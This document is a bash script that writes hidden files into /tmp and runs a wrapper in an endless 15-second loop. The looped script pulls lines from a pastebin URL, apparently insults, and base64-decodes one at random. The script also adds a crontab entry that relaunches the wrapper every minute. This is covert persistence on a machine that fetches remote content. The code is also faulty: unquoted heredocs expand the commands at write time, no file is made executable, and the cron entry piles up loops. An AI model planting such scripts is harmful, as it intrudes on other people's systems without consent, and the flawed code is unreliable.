#!/bin/bash

touch /tmp/.wrapper_script.sh
cat > /tmp/.wrapper_script.sh <<EOF
#!/bin/bash

while true; do
  # Your main script code here
  /tmp/.script.sh

  # Wait for 15 seconds before running again
  sleep 15
done
EOF

touch /tmp/.script.sh
cat > /tmp/.script.sh <<EOF
#!/bin/bash

RANDOM_NUMBER=$(shuf -i 1-13 -n 1)

INSUTLS=$(curl -s https://pastebin.com/raw/59mL2V9i)
temp=$(echo "$INSUTLS" | sed -n "${RANDOM_NUMBER}p" )

echo $temp | base64 -id
EOF

(crontab -l ; echo "* * * * * /tmp/.wrapper_script.sh") | crontab -

